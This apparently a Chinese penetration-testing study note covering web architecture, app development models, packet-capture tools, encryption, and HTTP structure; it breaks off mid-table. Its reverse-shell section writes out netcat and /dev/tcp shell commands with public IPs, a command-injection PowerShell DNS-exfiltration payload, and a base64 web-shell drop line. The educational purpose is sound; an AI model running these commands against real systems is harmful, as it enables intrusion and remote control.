[{"id":"b08904c0bab28ee83d3b8e8bd866184d","title":"网安知识点笔记（持续更新中）","content":"网安知识点\n基础入门\n一、Web 应用\nWeb 四大件\n1.系统\n\nLinux、windows、macos\n\n2.中间件\n\n我们经常管 web 中间件叫做 web 服务器或者 web 容器，中间件（英语：Middleware）是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。\n也就是说，关于中间件，我们可以理解为：是一类能够为一种或多种应用程序合作互通、资源共享，同时还能够为该应用程序提供相关的服务的软件。（注意：中间件是一类软件的总称，不是单独的一个软件）\n常见的 web 中间件有: Apache Websphere IIS tomcat JBoss Weblogic IBM HTTP Server NGINX\n核心功能包括：\n\n1.HTTP 协议处理：解析请求并生成响应（如 Apache、Nginx 的 HTTP 引擎）\n2.静态资源服务：直接返回 HTML、CSS、图片等文件\n3.动态内容支持：通过 PHP、Node.js 等语言生成个性化数据\n4.安全控制：SSL/TLS 加密、访问权限管理\n\n\n\n中间件配置对后续部署的影响\n中间件（如 Nginx、Tomcat、Redis）的配置直接影响系统的性能、稳定性和可维护性，具体如下：\n\n负载均衡：Nginx 可配置反向代理，将请求分发到多个后端服务器，避免单节点过载，提升系统可用性。\n缓存策略：Redis 作为缓存中间件，合理配置缓存过期时间和淘汰策略，可减少数据库访问压力，加快响应速度。\n安全防护：中间件可配置 SSL 证书（HTTPS）、请求过滤（防 SQL 注入、XSS），增强系统安全性。\n日志与监控：中间件的日志配置（如访问日志、错误日志）便于后续故障排查，监控配置（如 CPU / 内存占用）可提前发现性能瓶颈\n\n3.数据库\n\n常见的有：mysql，mssql，access\n\n本地存储：\n\n源码和数据库放在一起\n\n站库分离：\n\n\n将网站应用程序（前端 + 后端）与数据库服务器分离部署在不同服务器上，优势包括：\n\n\n提升性能：应用和数据库服务器资源独立分配，避免相互抢占资源（如 CPU、内存）。\n\n\n增强安全性：数据库服务器可单独配置防火墙和访问策略，减少直接暴露风险。\n\n\n便于扩展：应用和数据库可各自根据流量需求扩容，例如数据库可通过主从复制提升读性能。\n\n\n云数据库：\n\n安全组和登陆方式配置可以更加复杂。甚至有 oos 对象存储服务，专门用来放置图片和视频，更加安全\n\n4.源码\n实现网站功能的代码集合，包括：\n\n1.前端技术：HTML/CSS/JavaScript 构建用户界面，框架如 Vue、React\n2.后端逻辑：PHP、Python、Java 等处理业务\n3.架构模式：\n\n单体应用：传统模式，代码集中\n微服务：模块式拆分，适合复杂系统\n\n\n\n源码类型：\n\n开源、商业、自研\n\nWeb 架构\n1.常规化\n\n原理：源码数据都在同服务器\n影响：无，常规安全测试手法\n\n2.站库分离\n\n原理：源码数据库不在同服务器\n存储：其他服务器上数据库&amp;云数据库产品\n影响：数据被单独存放，能连接才可影响数据\n\n3.前后端分离\n\n原理：前端 JS 框架，API 传输数据\n影响：\n\n1.前端页面大部分不存在漏洞\n2.后端管理大部分不在同域名\n3.获得权限有可能不影响后端\n\n\n\n4.宝塔+phpstudy\n\n原理：打包类集成环境，权限配置或受配置\n影响：攻击者权限对比区别\n区别：宝塔更安全一点\n\n5.Docker 容器\n\n原理：虚拟化技术独立磁盘空间\n影响：攻击者虚拟空间磁盘\n\n6.建站分配站\n\n1.托管\n2.申请\n原理：利用别人域名模版建立\n影响：实质安全测试非目标资产\n\n7.静态 Web\n\n例子：大学学的 html 设计网站\n原理：数据没有传输性（js 传输不算）\n影响：无漏洞\n\n8.WAF\n\n原理：Web 应用防火墙，旨在提供保护\n影响：常规 Web 安全测试手段会受到拦截\n演示：免费 D 盾防护软件\nWindows2012 + IIS +D 盾\n\n\n9.CDN\n\n原理：内容分发服务，旨在提高访问速度\n影响：隐藏真实源 IP，导致对目标测试错误\n演示：阿里云备案域名全局 CDN 加速服务\nWindows2012 + BT 宝塔面板 + CDN 服务\n\n\n10.OSS\n\n\n原理：云存储服务，旨在提高访问速度\n\n\n演示：https://cloudreve.org/\nWindows2012 + cloudreve + 阿里云 OSS\nhttps://github.com/cloudreve/Cloudreve/releases/tag/3.7.1\n1、启动应用\n2、登录管理\n3、配置存储信息\n4、更改用户组存储属性\n\n\n阿里云 OSS:\n1、开通 OSS\n2、新建 Bucket\n3、配置 Bucket 属性\n4、配置 Access 访问\n\n\n==为什么要使用第三方存储？==\n\n静态文件会占用大量带宽\n加载速度\n存储空间\n\n影响：\n\n\n上传的文件或解析的文件均来自于 OSS 资源，无法解析，单独存储\n\n\n1、修复上传安全\n\n\n2、文件解析不一样\n\n\n3、但 Accesskey 隐患\n\n\n\n\n\n11.反向代理\n\n\n正向代理为客户端服务, 客户端主动建立代理访问目标（不代理不可达）\n反向代理为服务端服务, 服务端主动转发数据给可访问地址（不主动不可达）\n\n\n原理：通过网络反向代理转发真实服务达到访问目的\n\n\n影响：访问目标只是个代理，并非真实应用服务器\n\n\n注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！\n\n\n补充：正向代理就相当于一个服务器你无法访问自己找了个代理服务器去访问\n反向代理就是你本来无法访问那个服务器，所以服务器那边整了个搭理服务器让你访问\n\n\n12.负载均衡\n\n原理：分摊到多个操作单元上进行执行，共同完成工作任务\n影响：有多个服务器加载服务，测试过程中存在多个目标情况\n\n二、App 应用\n应用开发架构\n1.原生开发\n原生 APP 开发是指针对特定平台(iOS/Android)使用官方语言和工具进行开发的方式。\n安卓一般使用 java 语言开发，当然现在也有 kotlin 语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。\n原生开发有以下特点：\n（1）==平台特性==\n\niOS 使用 Swift/Objective-C + Xcode 开发，遵循 Apple 设计规范\nAndroid 使用 Java/Kotlin + Android Studio 开发，遵循 Material Design\n\n（2）==安全优势==\n\n性能优化好，可直接调用系统安全 API\n可实施更严格的安全措施如代码混淆、完整性校验\n支持双向 TLS(mTLS)等高级安全协议\n\n（3）==安全风险==\n\n需防范逆向工程(反编译、动态调试)\nAPI 接口暴露风险\n平台差异导致的安全策略不一致\n\n（4）==网安测试要点==\n\n接口安全测试(抓包分析)\n本地数据存储安全\n组件权限配置检查\n\n（5）==安全影响==\n\n反编译&amp;抓包&amp;常规测试\n逆向的角度去分析逻辑设计安全\n\n2.H5 语言开发\nH5(HTML5)是 HTML 的第五代标准，作为现代 Web 开发的核心技术，它已成为构建跨平台应用的重要工具。\n使用 H5 开发的好处有很多，可多端复用，比如浏览器端，ios 端，当然 H5 开发的体验是没有原生好的。一般来说如果这个页面需要分享出去的话，就用 H5 开发。\nH5 开发具有以下特点：\n（1）==H5 技术基础==\n\n核心组件：HTML5(结构)+CSS3(样式)+JavaScript(逻辑)，三者协同工作\n关键 API：Canvas 绘图、WebGL(3D 渲染)、Web Audio(音频处理)、Geolocation(定位)等\n存储机制：支持 localStorage/sessionStorage 本地存储，比 Cookie 更安全但需防范 XSS 攻击\n\n（2）==安全特性==\n\n沙箱机制：默认运行在浏览器安全沙箱中，限制系统资源访问\nCORS 策略：通过跨域资源共享策略控制外部资源访问\nHTTPS 支持：强制要求混合内容中的敏感资源使用安全传输\n\n（3）==安全风险==\n\nXSS 漏洞：动态内容注入风险高于原生应用\n数据泄露：本地存储数据可能被恶意读取\n中间人攻击：网络阐述层需额外加密保护\n\n3.使用 flutter 开发\nFlutter 是 Google 推出的跨平台应用开发框架，使用 Dart 语言编写，能够构建 iOS、Android、Web 及桌面端应用。但由于是近几年退出的的，技术比较新，生态还不完善，开发效率偏低\nFlutter 开发具有以下特点：\n（1）==核心特性==\n\n跨平台支持：一套代码可编译为 iOS、Android、Web、Windows、macOS 和 Linux 应用\n高性能渲染：使用 Skia 引擎直接渲染，绕过平台原生组件，性能接近原生应用\n热重载功能：修改代码后无需重启应用即可看到效果，大幅提升开发效率\n\n（2）==安全优势==\n\n代码混淆支持：可对 Dart 代码进行混淆，增加逆向工程难度\n安全存储机制：提供 flutter_secure_storage 等插件安全存储敏感数据\nHTTPS 强制支持：网络请求默认强制使用 HTTPS 加密传输\n\n（3）==安全风险==\n\nDart 代码反编译：相比原生代码更易被反编译分析\n插件安全依赖：第三方插件可能引入安全漏洞\n跨平台一致性风险：不同平台可能实现安全机制不一致\n\n（4）==网安测试要点==\n\n接口安全测试：检查 API 接口的认证、授权和数据加密\n本地存储检查：验证敏感数据是否加密存储\n权限管理审计：检查应用是否遵循最小权限原则\n代码混淆验证：确认发布版本是否经过充分混淆\n\n4.常规 Web 开发\nWeb 开发是构建在互联网上运行的网站和应用程序的过程，主要分为前端和后端两大技术方向。\nWeb App 软件开发简单地说，就是开发一个网站，然后加入 app 的壳。Web App 一般非常小，内容都是 app 内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且 app 内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。\nWeb 开发具有以下特点：\n（1）==核心技术栈==\n\n前端技术：\n\nHTML：定义网页结构和内容\nCSS：控制网页样式和布局\nJavaScript：实现交互功能和动态效果\n前端框架：React、Vue、Angular 等提高开发效率\n\n\n后端技术：\n\n服务器语言：PHP、Java、Python、Node.js 等\n数据库：MySQL、PostgreSQL、MongoDB 等\nWeb 服务器：Apache、Nginx 等\n\n\n\n（2）==安全特性==\n\n浏览器安全机制：\n\n同源策略限制跨域访问\nCSP(内容安全策略)可缓解 XSS 攻击\nHTTPS 加密传输保障数据安全\n\n\n认证与授权：\n\n支持多种认证方式(OAuth、JWT 等)\n可实施细粒度访问控制\n\n\n\n（3）==安全风险==\n\n常见漏洞：\n\nXSS(跨站脚本攻击)\nSQL 注入\nCSRF(跨站请求伪造)\n文件上传漏洞\n\n\n数据安全风险：\n\n敏感信息泄露\n会话劫持\nAPI 接口滥用\n\n\n\n（4）==网安测试要点==\n\n渗透测试：\n\n检查输入验证和输出编码\n测试认证和会话管理机制\n验证敏感数据保护措施\n\n\n代码审计\n\n检查安全编码实践\n识别硬编码凭证\n评估第三方库风险\n\n\n\n三、反弹 shell\n1.文件上传下载\n作用：解决无图形化&amp;解决数据传输\n使用：在 ip 地址搭建 web 在目录上放我们的工具，访问即可下载，我们利用网站生成传输文件命令，通过命令执行漏洞让目标下载上我们的工具，然后可以进行我们下一步的操作\n![](./网安知识点.assets/屏幕截图 2025-06-15 232304.png)\n![](./网安知识点.assets/屏幕截图 2025-06-15 233009.png)\n2.反弹 shell 命令\n（1）==定义==\n\n反弹 Shell 是一种网络攻击技术，被控端（受害者）主动连接控制端（攻击者），并将命令行输入输出重定向到控制端，实现远程控制。与传统的 SSH、Telnet 等 正向连接 相反，反弹 Shell 通过角色反转绕过防火墙等限制\n\n（2）==基本原理==\n\n控制端：监听指定 TCP/UDP 端口（如 nc -lvp 4444）。\n被控端：执行命令将 Shell 会话重定向到控制端（如 bash -i &amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1），通过 Socket 通信传输数据\n\n（3）==正向连接==\n\n定义：正向连接指 控制端（攻击者）主动发起连接 至被控端（目标机器），要求目标机器开放指定端口并允许入站连接\n原理：\n\n被控端启动监听服务（如 nc -lvvp 5566 -e /bin/bash）。\n控制端主动连接目标 IP 和端口（如 nc 目标IP 5566），建立 Shell 会话\n\n\nLinux 控制 Windows\n\n1234//绑定 CMD 到本地 5566 端口nc -e cmd -lvp 5566//主动连接目标 5566ncat 47.122.23.131 5566\n\nWindows 控制 Linux\n\n1234//绑定 SH 到本地 5566 端口ncat -e /bin/sh -lvp 5566//主动连接目标 5566nc 47.94.236.117 5566\n\n特点：\n\n控制端主动连接目标\n类似 SSH/Telnet 等传统服务\n适用于内网无防护环境\n\n\n限制：\n\n目标需有固定公网 IP 或端口映射\n防火墙/NAT 可能阻止入站连接\n动态 IP 目标难以持续控制\n\n\n典型场景：\n\n内网渗透：攻击已进入内网，直接连接未防护的目标机器\n服务暴露：目标机器主动开放端口提供远程管理（如数据库服务）\n\n\n\n（4）==反向连接==\n\n定义：\n\n反向连接指 被控端主动连接控制端，由攻击者预先监听端口，目标机器发起请求建立 Shell 会话\n\n\n原理：\n\n控制端监听端口（如 nc -lvp 4444）。\n被控端执行命令反向连接（如 bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1）\n\n\nWindows 控制 Linux\n\n1234//绑定 CMD 到目标 5566 端口ncat -e /bin/sh 47.122.23.131 5566  //靶机//等待 5566 连接nc -lvvp 5566\n\nLinux 控制 Windows\n\n1234//绑定 CMD 到目标 5566 端口nc -e cmd 47.94.236.117 5566   //靶机//等待 5566 连接ncat -lvvp 5566\n\n特点：\n\n被控端主动出站\n控制端无需暴露 IP\n适应动态 IP 环境\n\n\n优势：\n\n绕过防火墙/NAT 限制\n隐蔽性强，避免 IDS 检测\n适合外网渗透和持久控制\n\n\n典型场景：\n\n防火墙绕过：目标仅允许出站流量（如企业内网）\n动态 IP 控制：目标 IP 频繁变化（如家庭宽带）\n恶意软件分发：木马主动连接 C2 服务器\n\n\n\n（5）==正反向连接对比==\n\n\n\n对比维度\n正向连接\n反向连接\n\n\n\n\n连接方向\n控制端 → 被控端\n被控端 → 控制端\n\n\n防火墙穿透\n依赖入站规则\n利用出站规则\n\n\n适用环境\n内网无防护\n外网/动态 IP\n\n\n隐蔽性\n易被检测\n隐蔽性高\n\n\n工具依赖\n需目标开放端口\n需控制端监听端口\n\n\n\n（6）==命令执行==\n\n通过管道符，进行额外的命令执行\nwindows： |  &amp;  ||  &amp;&amp;\nLinux： ;  |  ||  &amp;  &amp;&amp;  （特有``和;）\n例子：\n\nping -c 1 127.0.0.1 ; whoami\n\n\n\n（7）==数据不回显==\n\n通常我们执行命令，要先看目标是什么系统，但如果没有回显，就不能用 ping -c 1 127.0.0.1 ; whoami\n如果是 Linux 的话，我们可以 ping 反引号+whoami+反引号.dns 网址，就可以在那个网址上看到执行完 whoami 的 ip\n但 windows 不行，windows 并没有``所以我们需要，用别的方法来进行操作，比如\n\n12127.0.0.1 | powershell $x=whoami;$x=$x.Replace(&#x27;\\&#x27;,&#x27;xxx&#x27;);$y=&#x27;.dns网址&#x27;;$z=$x+$y;ping $z//我们可以通过powershell将我们想要输出的内容，通过变量进行输出，这样也可以得到我们想要的信息\n四、抓包工具\nFiddler\n\n\n核心定位：HTTP/HTTPS 调试代理，专注 Web 应用层安全分析\n\n\n协议支持：HTTP/HTTPS（可解密 SSL/TLS）、WebSocket。\n\n\n网络安全应用场景：\n\n漏洞挖掘：拦截修改请求/响应，测试 XSS、CSRF、参数篡改等漏洞\n会话劫持：捕获 Cookie/Session ID，重放会话验证身份验证缺陷\nHTTPS 解密：通过中间人攻击（MITM）解密 HTTPS 流量，分析加密内容\n\n\n\n使用技巧：\n\n断点调试：Rules &gt; Automatic Breakpoints 拦截请求修改参数（如注入 Payload）\nAutoResponder：模拟恶意响应（如替换 JS 文件植入后门）\n移动端抓包：配置手机代理至 PC IP+端口（默认 8888），安装 Fiddler 根证书解密 HTTPS\n\n\n\nCharles\n\n核心定位：HTTP/HTTPS 代理，侧重 API 调试与可视化分析\n协议支持：HTTP/HTTPS、FTP、SMTP。\n网络安全应用场景：\n\nAPI 安全测试：树状结构展示请求层级，分析接口参数敏感数据泄露\n重放攻击测试：修改历史请求重复发送，验证服务端幂等性漏洞\n弱网模拟：Proxy &gt; Throttle Settings 测试超时处理、重放攻击成功率\n\n\n使用技巧：\n\nMap 功能：重定向请求至恶意服务器（Tools &gt; Map Remote）\nSSL 代理：Proxy &gt; SSL Proxying Settings 添加 *:443 全局解密 HTTPS\n移动端配置：类似 Fiddler，需安装 Charles 证书（Help &gt; SSL Proxying）\n\n\n\nTcpDump\n\n核心定位：命令行网络嗅探器，适用于服务器层流量捕获\n协议支持：全协议（TCP/IP 栈），包括 ARP、ICMP、DNS 等。\n网络安全应用场景：\n\n网络层攻击检测：抓取 SYN 洪水攻击（tcpdump 'tcp[tcpflags] &amp; tcp-syn != 0'）\n异常流量分析：识别异常 ARP 请求（ARP 欺骗）、异常 ICMP（隧道攻击）\n数据泄露监控：捕获含敏感关键词的明文传输（如 tcpdump -A port 80 | grep &quot;password&quot;）\n\n\n\n==BurpSuite==\n\n核心定位：集成化 Web 应用渗透测试平台\n协议支持：HTTP/HTTPS、WebSocket。\n网络安全应用场景：\n\n自动化漏洞扫描：Scanner 模块检测 SQL 注入、XSS 等 OWASP Top 10 漏洞\n暴力破解：Intruder 模块自动化密码爆破（如撞库攻击测试）\n逻辑漏洞挖掘：Repeater 修改请求顺序，测试越权、支付漏洞\n\n\n使用技巧：\n\n证书配置：浏览器安装 Burp CA 证书（http://burp/cert）解密 HTTPS\n爬虫与扫描：Spider 映射站点结构，Scanner 自动扫描入口点\n插件扩展：集成 Logger++ 记录历史流量，Autorize 测试垂直越权\n\n\n\nWireshark\n\n核心定位：全协议深度解析的网络协议分析器\n协议支持：超 700 种协议（TCP/IP、DNS、DHCP、SSH 等）。\n网络安全应用场景：\n\n协议漏洞分析：解析异常协议字段（如畸形 DNS 响应引发缓存中毒）\n网络取证：重组 TCP 流追踪攻击路径（Follow TCP Stream）\n恶意软件通信：检测 C2 服务器连接（如识别 DNS 隧道、非标准端口加密流量）\n\n\n使用技巧：\n\n显示过滤器：http.request 过滤 HTTP 请求，tls.handshake 聚焦 TLS 协商\n着色规则：标记异常流量（如 TCP 重传标红）\n统计功能：Statistics &gt; Endpoints 定位高流量异常主机\n\n\n\n科来网络分析系统\n\n核心定位：国产企业级流量分析工具，侧重网络诊断与安全审计\n协议支持：主流协议全覆盖，支持自定义协议解码。\n网络安全应用场景：\n\n内网威胁狩猎：矩阵视图 可视化主机连接，定位横向移动或矿机通信\n木马检测：分析异常 DNS 请求（如频繁解析动态域名）\n数据泄露监控：日志视图 追踪 HTTP 文件传输、SMTP 邮件外发\n\n\n使用技巧：\n\n诊断视图：自动标记 TCP 重传、ARP 欺骗等异常事件\n回溯分析：保存流量回放复现攻击链（文件 &gt; 保存抓包文件）\n自定义协议：解码私有协议或恶意软件通信格式\n\n\n\n各个抓包工具的差异\n\n\n\n工具\n最佳场景\n协议侧重\n安全测试优势\n\n\n\n\nFiddler\nWeb 调试/移动端 HTTPS 分析\nHTTP/HTTPS\n请求篡改、会话劫持\n\n\nCharles\nAPI 安全/弱网测试\nHTTP/HTTPS\n流量重定向、重放攻击\n\n\nTcpdump\n服务器层流量捕获\n全协议\n实时攻击检测、命令行高效操作\n\n\nBurp Suite\nWeb 渗透测试\nHTTP/HTTPS\n自动化漏洞扫描、暴力破解\n\n\nWireshark\n全协议深度解析\n700+协议\n协议漏洞分析、网络取证\n\n\n科来\n内网威胁狩猎/网络诊断\n主流协议+自定义\n可视化追踪、自动异常诊断\n\n\n\n五、算法加密\n1.算法加密的应用对象和安全价值\n（1）数据传输保护\n\nHTTPS/TLS：采用混合加密（RSA 交换密钥 + AES 加密数据），防中间人窃听。TLS 1.3 已禁用弱算法（如 RC4、SHA-1），优先支持 AES-GCM 和 ChaCha20-Poly1305。\n端到端加密：消息应用（如 Signal）使用双棘轮协议，每次会话更新密钥，防历史消息解密\n\n（2）敏感数据存储\n\n数据库字段加密：信用卡号、身份证号等采用 AES-256 加密，密钥由 HSM（硬件安全模块）管理\n全盘加密：BitLocker（Windows）、FileVault（Mac）使用 XTS-AES 模式，防物理窃取\n\n（3）身份验证与签名\n\n数字证书：RSA/ECC 非对称加密实现身份绑定，CA 私钥泄露将导致信任链崩塌（如沃通事件）\n区块链交易：ECDSA 签名验证资产所有权，私钥丢失即永久丧失资产控制权\n\n2.数据传输\n（1）传输数据-编码型&amp;加密型\n\n某视频\n某 Web 站\n博客登录\nApp 斗地主\n影响：漏洞探针\n\n（2）传输格式-常规&amp;JSON&amp;XML\n\nApp 期 H\nApp 斗地主\n影响：发送漏洞探针，回显数据分析\n\n（3）密码存储-Web&amp;系统&amp;三方应用\n\nZZZCMS&amp;Dz\nWin&amp;Linux\nMSSQL&amp;MYSQL\n影响：安全后渗透测试\n\n（4）代码混淆-源代码加密&amp;逆向保护\n\nPHP&amp;Js 混淆加密\nEXE&amp;JAR 代码保护\n影响：代码审计，逆向破解\n\n==为什么要了解数据在传输的时候进行编码？==\n\n\n对方服务器可能会在接受的时候进行解码在带入\n\n\n如果我们还是按照原有思路不对自己的 Payload 进行同样编码的话 传入过去的东西就是不认识的东西 测试无效\n\n\n正确方式：测试的话也要进行 payload 同样的加密或编码进行提交\n安全测试漏洞时候 通常都会进行数据的修改增加提交测试\n以数据的正确格式发送 接受才行\n\n\n3.常见加密算法\n==3.1.单向散列加密==\n（1）核心原理与识别方式\n\n原理：将任意长度输入（消息）通过哈希函数（如 SHA-256）转换为 固定长度的输出（散列值），具有 单向性（不可逆）和 抗碰撞性（不同输入产生相同输出的概率极低）\n优点：方便存储，损耗低：加密/加密对于性能的损耗微乎其微。\n缺点：单向散列加密的缺点就是存在暴力破解的可能性，最好通过加掩码值的方式提高安全性，此外可能存在散列冲突。我们都知道 MD5 加密也是可以破解的。\nmd5 的三个特征：\n\n确定性：一个原始数据的 MD5 值是唯一的，同一个原始数据不可能会计算出多个不同的 MD5 值。\n碰撞性：原始数据与其 MD5 值并不是一一对应的，有可能多个原始数据计算出来的 MD5 值是一样的，这就是碰撞。\n不可逆：也就是说如果告诉你一个 MD5 值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第 4 点，一个给定的 MD5 值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。\n\n\n\n（2）核心算法\n\n安全算法：SHA-256、SHA-3（抗量子计算）\n风险算法：MD5、SHA-1（已被攻破，易碰撞攻击）\n\n（3）当今社会应用场景\n\n密码存储：用户密码存储为散列值（如 bcrypt 加盐哈希），即使数据库泄露也无法还原明文\n文件完整性校验：软件下载站提供文件的 SHA-256 散列值，用户验证文件是否被篡改（如 Tomcat 官网）\n数字签名基础：对消息摘要签名（如 HMAC 算法），确保数据来源可信（API 接口验签）\n云盘秒传：通过文件哈希值匹配云端已有文件，避免重复上传（如百度网盘）\n\n==3.2.对称加密==\n（1）核心原理与识别方式\n\n原理：加密和解密使用 同一密钥（如 AES-256），算法高效但密钥需安全分发\n优点：对称加密优点是算法公开、计算量小、加密速度快、加密效率高\n缺点：发送方和接收方必须商定好密钥，然后使双方都能保存好密钥，密钥管理成为双方的负担。\n识别特征：\n\n加/解密速度快，适合大数据量；\n密钥管理复杂（需安全通道传输密钥）；\n常见算法标识：AES、DES（已淘汰）、3DES。\n\n\n\n（2）核心算法\n\nAES（Advanced Encryption Standard）：\n支持 128/192/256 位密钥，GCM 模式提供认证加密\n3DES：三重 DES 增强安全性，但因性能差被 AES 取代\n\n（3）当今社会应用场景\n\n数据传输加密：\n\nHTTPS 通信中的 会话加密（TLS 握手后使用 AES 加密数据流）\nWi-Fi 安全协议（WPA3 使用 AES-256）\n\n\n静态数据保护：\n\n数据库字段加密（如信用卡号用 AES 加密存储）\n全盘加密工具（如 BitLocker、FileVault）\n\n\n实时通信加密：\n\n视频会议系统（如 Zoom）使用 AES 加密音视频流\n\n\n\n\n==3.3.非对称加密==\n（1）核心原理与识别方式\n\n原理：使用 密钥对（公钥加密、私钥解密），公钥可公开，私钥保密\n优点：非对称加密的优点是与对称加密相比，安全性更好，加解密需要不同的密钥，公钥和私钥都可进行相互的加解密。\n缺点：缺点是加密和解密花费时间长、速度慢，只适合对少量数据进行加密。\n识别特征：\n\n加/解密速度慢，适合小数据量（如密钥交换）；\n支持数字签名（私钥签名，公钥验证）；\n常见算法标识：RSA、ECC（椭圆曲线）。\n\n\n\n（2）核心算法\n\nRSA：基于大整数分解难题（密钥 ≥2048 位）\nECC：相同安全强度下密钥更短（256 位 ≈RSA 3072 位），适合移动设备\n\n（3）当今社会应用场景\n\n安全通信基石：\n\nTLS/SSL 握手：通过 RSA/ECC 交换对称会话密钥（如浏览器 HTTPS 连接）\n端到端加密：消息应用（如 Signal）使用 ECDH 协议动态生成密钥\n\n\n数字身份认证：\n\n数字证书（CA 用私钥签名，公钥验证网站身份）\n区块链交易签名（比特币用 ECDSA 验证所有权）\n\n\n数据防篡改：\n\n文档/软件签名（如 Adobe PDF 签名、安卓 APK 签名）\n\n\n\n\n\n==3.4.Base 系列加密==\n1.Base64\n\n\n原理：\n\n将 3 字节（24 位） 二进制数据按 6 位一组 划分为 4 组，每组映射到 64 字符集（A-Za-z0-9+/），末尾用 = 填充至 4 的倍数。\n示例： &quot;ABC&quot; → 二进制 01000001 01000010 01000011 → 6 位分组 010000 010100 001001 000011 → 映射为 &quot;QUJD&quot;。\n\n\n\n识别特征：\n\n密文含 A-Za-z0-9+/=，长度必为 4 的倍数（如 SGVsbG8=）；\n无小写字母 o、数字 0、大写 I 等易混淆字符。\n\n\n\n攻防应用：\n\n攻击利用：隐藏 Web Shell（echo PD9waHA... | base64 -d &gt; shell.php）\nWAF 绕过：多重编码（Base64 → URL 编码 → Hex）干扰正则检测\n防御场景：邮件附件、HTTPS 证书、图片内嵌（Data URL）。\n\n\n\n安全风险：非加密算法，可直接解码 暴露数据，需搭配 AES 等加密使用\n\n\n2.Base32\n\n原理：将 5 字节（40 位） 数据按 5 位一组 划分为 8 组，映射到 32 字符集（A-Z2-7），用 = 填充至 8 的倍数。\n识别特征：\n\n全大写字母+数字 2-7（如 JBSWY3DP），无 1/8/9/0 等字符；\n长度通常为 8 的倍数。\n\n\n攻防应用：\n\n隐蔽通信：恶意软件命令传输（如 DNS 隧道中隐藏 C2 指令）；\n兼容性优势：比 Base64 更易人工识别（无大小写混淆）\n\n\n\n==3.5.加密算法的对比与选型==\n\n\n\n技术类型\n代表算法\n密钥管理\n速度\n安全性依赖\n典型应用场景\n攻击风险\n\n\n\n\n单向散列加密\nSHA-256, bcrypt\n无密钥\n极快（纳秒级）\n抗碰撞性\n密码存储、文件校验\n彩虹表攻击（未加盐）\n\n\n对称加密\nAES-256-GCM\n单一密钥，需安全分发\n快（GB/s 级）\n密钥保密性\n数据库加密、实时通信\n侧信道攻击、弱密钥爆破\n\n\n非对称加密\nECC-256, RSA-2048\n密钥对（公钥/私钥）\n慢（KB/s 级）\n私钥保密性\n密钥交换、数字签名\n量子计算威胁（RSA）\n\n\nBase64 编码\n无\n无密钥\n快\n非加密！\nHTTP 数据传输、邮件附件\n裸数据暴露、WAF 绕过\n\n\n\n4.加密算法的特点\n4.1.MD5\n\n由数字“0-9”和字母“a-f”所组成的字符串\n固定的位数 16 和 32 位\n==解密需求==：密文即可，但复杂的明文可能解不出\n\n4.2.Base64\n\n大小写区分，通过数字和字母的组合\n一般情况下密文尾部都会有两个等号，明文很少的时候则没有\n明文越长密文越长，一般不会出现 “/” “+” 在密文中\n\n4.3.AES、DES\n\n同 BASE64 基本类似，但一般会出现 “/” 和 “+” 在密文中\n==解密需求==：密文，模式，加密 Key，偏移量，条件满足才可解出\n\n4.4.RSA\n\n特征同 AES, DES 相似，但是长度较长\n==解密需求==：密文，公钥或私钥即可解出\n\n六、HTTP 数据包\n一、HTPP 数据包基础\n1. 定义与定位\n\n\n本质：HTTP 数据包是客户端（如浏览器）与服务器之间传输数据的格式化信息单元，分为 请求报文（Request）和 响应报文（Response）\n\n\n协议层级：位于 OSI 模型的应用层，依赖传输层 TCP 协议（默认端口 80）建立可靠连接\n\n\n2. 通信模型\n\n\n请求-响应模式：\n\n客户端发送请求 → 服务器返回响应 → 连接关闭（HTTP/1.0）或复用连接（HTTP/1.1+）\n\n\n\n无状态性：每个请求独立，需依赖 Cookie/Session 等机制维持会话状态\n\n\n二、请求报文结构解析\n1. 请求行**（Request Line）**\n1GET /api/data?page=1 HTTP/1.1\n\n\n请求方法：定义操作类型（共 8 种，详见下文）\n\n\n请求路径：资源位置（如 /api/data），可含查询参数（?page=1）。\n\n\n协议版本：HTTP/1.1（主流）或 HTTP/2（二进制分帧）\n\n\n2.请求头**（Request Headers）**\n键值对形式，描述客户端环境及请求属性：\n\n\n\n常用请求头\n功能说明\n\n\n\n\nHost: example.com\n目标域名（HTTP/1.1 强制要求）\n\n\nUser-Agent: ...\n客户端标识（浏览器/操作系统信息）\n\n\nAccept: text/html\n可接收的响应类型（MIME 类型）\n\n\nCookie: id=abc123\n携带会话凭证\n\n\nAuthorization: Bearer ...\n身份认证令牌\n\n\n\n3.请求体**（Request Body）**\n\n适用场景：POST、PUT、PATCH 方法提交数据（如 JSON、表单）\n长度标识：Content-Length 或 Transfer-Encoding: chunked（分块传输）\n\n三、响应报文结构解析\n1.状态行**（Status Line）**\n1HTTP/1.1 200 OK\n\n协议版本：同请求报文。\n状态码：3 位数字，标识处理结果（分类见下表）\n状态文本：描述性短语（如 OK）。\n\n2.状态码分类\n\n\n\n状态码\n分类\n名称\n定义与触发场景\n典型响应头\n幂等性\n\n\n\n\n100\n1xx (信息响应)\nContinue\n服务器已接收请求头，要求客户端继续发送请求体（用于大文件上传前的确认）\nExpect: 100-continue\n-\n\n\n101\n\nSwitching Protocols\n服务器同意协议切换（如 HTTP 升级至 WebSocket）\nUpgrade: websocket\n-\n\n\n102\n\nProcessing\n服务器已接收请求但处理未完成（WebDAV 异步操作）\n-\n-\n\n\n200\n2xx (成功)\nOK\n请求成功，响应体包含资源（GET）或操作结果（POST）\nContent-Type\n是\n\n\n201\n\nCreated\n资源创建成功（常见于 POST/PUT 请求）\nLocation: /new-resource\n否\n\n\n204\n\nNo Content\n请求成功但无返回内容（常见于 DELETE 请求）\n-\n是\n\n\n206\n\nPartial 